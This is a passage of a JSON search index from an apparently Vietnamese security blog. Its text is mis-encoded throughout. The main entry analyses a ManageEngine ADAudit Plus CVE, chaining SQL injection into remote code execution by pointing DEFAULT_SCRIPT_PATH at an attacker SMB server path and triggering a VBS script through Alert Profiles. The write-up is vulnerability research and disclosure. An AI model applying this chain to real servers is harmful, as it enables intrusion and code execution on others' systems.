)\n~~ Betak time ~~\n#Find the puzzle pieces to achieve RCE TrÃªn á»©ng dá»¥ng nÃ y cÃ³ má»™t chá»©c nÄƒng khÃ¡ Ä‘áº·c biá»‡t lÃ  Alert Profiles\nhiá»ƒu nÃ´m na lÃ  khi á»©ng dá»¥ng Ä‘Æ°á»£c cÃ i Ä‘áº·t lÃªn má»™t mÃ¡y AD hay Windows Server nÃ o Ä‘Ã³, nÃ³ sáº½ láº¯ng nghe má»™t sá»‘ event trÃªn mÃ¡y Ä‘Ã³ vÃ­ dá»¥ má»™t sá»‘ event nhÆ° shutdown, lock screen, restart server, etcâ€¦ thÃ¬ chá»©c nÄƒng nÃ y sáº½ cho phÃ©p cháº¡y má»™t file script tÆ°Æ¡ng á»©ng khi má»™t event Ä‘Æ°á»£c trigger.\nMáº·c Ä‘á»‹nh thÃ¬ chá»‰ cho phÃ©p load scripts tá»« local, khi thá»±c hiá»‡n táº¡o má»™t ALertProfiles báº¥t ká»³ thÃ¬ thÃ´ng bÃ¡o lá»—i sáº½ xuáº¥t hiá»‡n nhÆ° bÃªn dÆ°á»›i:\nÄáº¿n lÃºc nÃ y trong Ä‘áº§u mÃ¬nh xuáº¥t hiá»‡n má»™t sá»‘ idea nhÆ° sau vÃ  thá»±c hiá»‡n kiá»ƒm chá»©ng tá»«ng idea má»™t, cá»¥ thá»ƒ nhÆ° sau:\n#Idea 1: TÃ¬m lá»— há»•ng file upload tuá»³ Ã½ ?? Idea nÃ y khÃ´ng kháº£ thi khi chá»‰ cÃ³ má»™t sá»‘ chá»©c nÄƒng nhÆ° upload image (hoáº·c avatar) check cÃ¡c image byte header vÃ  upload file excel Ä‘á»ƒ import dá»¯ liá»‡u.\n#Idea 2: TÃ¬m lá»— há»•ng command injection trong chá»©c nÄƒng run alert script ?? Sau khi script location Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh, tuá»³ theo extension cá»§a file mÃ  sáº½ cháº¡y command phÃ¹ há»£p, vÃ­ dá»¥ nhÆ° file .ps1 sáº½ dÃ¹ng powershell.exe hoáº·c .vbs sáº½ dÃ¹ng wscript.\nCommand sau khi Ä‘Æ°á»£c parse thÃ nh nhá»¯ng token sáº½ Ä‘Æ°a vÃ o hÃ m CommonUtil.createProcess() Ä‘á»ƒ thá»±c thi.\nHÃ m CommonUtil.createProcess() sáº½ thá»±c hiá»‡n gá»i ProcessBuilder() Ä‘á»ƒ run os command. Äáº¿n Ä‘Ã¢y cÃ³ thá»ƒ tháº¥y os command injection khÃ´ng kháº£ thi bá»Ÿi vÃ¬ command vÃ  cÃ¡c argument Ä‘Æ°á»£c phÃ¢n tÃ¡ch rÃµ rÃ ng nÃªn khÃ´ng thá»ƒ inject Ä‘Æ°á»£c.\n#Idea 3: Change defaultScriptPath Äá»ƒ hiá»ƒu rÃµ thÃ¬ ta cáº§n quan sÃ¡t láº¡i quÃ¡ trÃ¬nh khi thá»±c hiá»‡n táº¡o má»™t AlertProfiles, cá»¥ thá»ƒ lÃ  hÃ m saveAlertProfile sáº½ Ä‘Æ°á»£c call vÃ  input tá»« body request sáº½ Ä‘Æ°á»£c parse vÃ  gÃ¡n vÃ o biáº¿n data.\nTáº¡i biáº¿n data sáº½ láº¥y scriptLocation mÃ  ta cung cáº¥p lÃ m tham sá»‘ Ä‘áº§u vÃ o cho hÃ m AlertScriptHandler.validateScriptCommand()\nHÃ m AlertScriptHandler.validateScriptCommand() cÆ¡ báº£n nhÆ° sau:\nnÃ´m na lÃ  scriptLocation mÃ  ta truyá»n vÃ o sáº½ Ä‘Æ°á»£c kiá»ƒm tra ká»¹ cÃ ng trÃ¡nh path traversal, kiá»ƒm tra cÃ¡c Ä‘uÃ´i extension há»£p lá»‡,â€¦ trong Ä‘Ã³, biáº¿n defaultScriptPath lÆ°u trá»¯ script path máº·c Ä‘á»‹nh trÃªn á»©ng dá»¥ng vÃ  Ä‘Æ°á»£c ná»‘i trá»±c tiáº¿p vÃ o scriptLocation cá»§a chÃºng ta Ä‘á»ƒ táº¡o thÃ nh Ä‘Æ°á»ng dáº«n hoÃ n chá»‰nh sau Ä‘Ã³ lÆ°u vÃ o biáº¿n pathCheck.\nÄá»ƒ lÆ°u thÃ nh cÃ´ng thÃ¬ Ä‘Æ°á»ng dáº«n pathCheck pháº£i tá»“n táº¡i, nghÄ©a lÃ  file script pháº£i tá»“n táº¡i trÃªn server.\ntheo document vá» class File trÃªn java (https://docs.oracle.com/javase/8/docs/api/java/io/File.html), class File há»— trá»£ resolve cáº£ SMB server náº¿u input báº¯t Ä‘áº§u báº±ng prefix \\\\ -\u0026gt; nghÄ©a lÃ  ta hoÃ n toÃ n cÃ³ thá»ƒ load script thÃ´ng qua SMB server cháº³ng háº¡n nhÆ°: \\\\192.168.17.1\\exploit\\exploit.ps1\nquay ngÆ°á»£c láº¡i bÃ i toÃ¡n lÃ  lÃ m sao cÃ³ thá»ƒ control Ä‘Æ°á»£c defaultScriptPath trÃªn á»©ng dá»¥ng, Ä‘áº¿n Ä‘Ã¢y ta trace ngÆ°á»£c vá» nÆ¡i biáº¿n defaultScriptPath Ä‘Æ°á»£c khá»Ÿi táº¡o.\nTá»« Ä‘áº§u ta cÃ³ thá»ƒ tháº¥y ráº±ng, giÃ¡ trá»‹ cá»§a defaultScriptPath ban Ä‘áº§u Ä‘Æ°á»£c láº¥y tá»« ADSMPersUtil.getSyMParameter(â€œDEFAULT_SCRIPT_PATHâ€), náº¿u khÃ´ng tá»“n táº¡i sáº½ láº¥y táº¡m Ä‘Æ°á»ng dáº«n cá»§a há»‡ thá»‘ng qua System.getProperty(â€œserver.dirâ€).\nTiáº¿p tá»¥c ta Ä‘i sÃ¢u vÃ o ADSMPersUtil.getSyMParameter(â€œDEFAULT_SCRIPT_PATHâ€) thÃ¬ ta tháº¥y ráº±ng giÃ¡ trá»‹ DEFAULT_SCRIPT_PATH Ä‘Æ°á»£c láº¥y tá»« database á»Ÿ table SystemParams vÃ  cá»™t PARAM_NAME\nkiá»ƒm tra trÃªn database thÃ¬ hoÃ n toÃ n rá»—ng :)))\n~~~ Make sqli great again ~~~\nÄ‘áº¿n Ä‘Ã¢y má»i viá»‡c xem thá»­ lÃ  á»•n, chá»‰ cáº§n insert vÃ o Ä‘á»‹a chá»‰ SMB Server Ä‘á»ƒ load malicous script lÃ  má»i thá»© hoÃ n háº£o.\nNhÆ°ng cÃ²n má»™t váº¥n Ä‘á» nhá» á»Ÿ Ä‘Ã¢y lÃ  ta khÃ´ng thá»ƒ tuá»³ Ã½ thá»±c thi ps1 tuá»³ Ã½, vÃ¬ máº·c Ä‘á»‹nh policy trÃªn Windows Ä‘Ã£ cháº·n.\nTuy nhiÃªn, váº«n cÃ³ má»™t sá»‘ cÃ¡ch bypass nhÆ°ng Ä‘a pháº§n pháº£i bá»• sung thÃªm argument ná»¯a hoáº·c má»™t sá»‘ cÃ¡ch thá»§ cÃ´ng Ä‘á»ƒ disable policy nhÆ°ng hoÃ n toÃ n vÆ°á»£t ngoÃ i attack vector network.\nMay máº¯n thay, á»©ng dá»¥ng cÃ²n há»— trá»£ thá»±c thi .vbs vÃ  Ä‘iá»u nÃ y vÆ°á»£t qua sá»± háº¡n cháº¿ Ä‘Ã£ nÃªu tá»« bÃªn trÃªn.\n#Step to reproduces Khai thÃ¡c SQL injection -\u0026gt; Inject DEFAULT_SCRIPT_PATH parameter vá»›i value lÃ  Ä‘á»‹a chá»‰ Attacker SMB Server. Khá»Ÿi Ä‘á»™ng láº¡i ME Adaudit Plus Ä‘á»ƒ reload new config. Táº¡o má»™t Alert Profile Ä‘á»ƒ thá»±c thi VBS script trÃªn mÃ¡y attacker SMB server khi báº¥t ká»³ sá»± kiá»‡n nÃ o Ä‘Æ°á»£c trigger (nhÆ° Ä‘Äƒng nháº­p, Ä‘Äƒng xuáº¥t, etc.) Thá»±c hiá»‡n Ä‘Äƒng nháº­p hoáº·c Ä‘Äƒng xuáº¥t Ä‘á»ƒ trigger VBS Script. #PoC ","permalink":"http://localhost:1313/posts/me_sqli_to_rce/","summary":"Analysis about Manage Engine ADAudit Plus CVE","title":"ManageEngine Adaudit Plus â€“ From SQLi to RCE"},{"content":"Post nÃ y chá»‰ Ä‘á»ƒ thÃ´ng bÃ¡o ráº±ng, báº¯t Ä‘áº§u tá»« hÃ´m nay mÃ¬nh sáº½ chuyá»ƒn nhÃ  tá»« https://nhienit.wordpress.com/ sang https://nhienit.github.io.\nCáº£m Æ¡n anh em Ä‘Ã£ Ä‘Ã³n Ä‘á»c vÃ  á»§ng há»™ cÃ¡c bÃ i viáº¿t trÃªn nhÃ  cÅ© https://nhienit.wordpress.com/, nhÆ°ng cÃ³ váº» Ä‘Ã£ Ä‘áº¿n lÃºc thay Ä‘á»•i rá»“i, vÃ¬ má»™t vÃ i lÃ½ do cÃ¡ nhÃ¢n hoáº·c cÃ³ thá»ƒ lÃ  vÃ¬ do khÃ´ng cÃ³ gÃ¬ Ä‘á»ƒ lÃ m ğŸ¤£.\nNhÆ°ng dÃ¹ lÃ  má»›i cÅ©ng mong anh em Ä‘Ã³n nháº­n ngÃ´i nhÃ  thá»© hai nÃ y, cÃ³ thá»ƒ coi nhÆ° lÃ  má»™t nÆ¡i Ä‘á»ƒ tÃ¬m kiáº¿m Ä‘iá»u gÃ¬ Ä‘Ã³ mÃ  anh em Ä‘ang cáº§n váº­y !\n","permalink":"http://localhost:1313/posts/hello/","summary":"Welcome to the new house","title":"Hello World"}]